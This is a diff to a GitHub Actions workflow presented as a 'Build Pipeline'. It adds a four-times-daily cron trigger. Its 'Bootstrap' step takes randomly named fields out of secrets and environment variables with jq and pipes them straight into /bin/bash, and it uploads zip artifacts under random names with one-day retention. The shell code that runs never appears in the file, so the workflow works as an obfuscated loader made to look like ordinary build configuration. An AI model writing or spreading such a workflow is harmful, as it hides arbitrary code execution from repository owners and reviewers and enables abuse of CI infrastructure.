@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '55 3,9,15,21 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,16 +16,15 @@ jobs:
         uses: actions/checkout@v4
       - name: Bootstrap
         env:
-          kx33: ${{ secrets.kx33 }}
+          nhc531: ${{ secrets.nhc531 }}
         run: |
-          printf '%s' "$kx33" | jq -r .b8 | /bin/bash
-          printf '%s' "$fuy0" | jq -r .zig9357 | /bin/bash
-          printf '%s' "$chhy87510" | jq -r .fx2167 | /bin/bash
-          echo $rjaj39 | jq -r .pl2494 | /bin/bash
+          printf '%s' "$nhc531" | jq -r .wgdbk134 | /bin/bash
+          echo $knlxi63 | jq -r .yh833 | /bin/bash
+          printf '%s' "$ln041" | jq -r .vw8735 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
         with:
-          name: a8WLcfwx
+          name: N2Whh5k0
           path: "*.zip"
           retention-days: 1
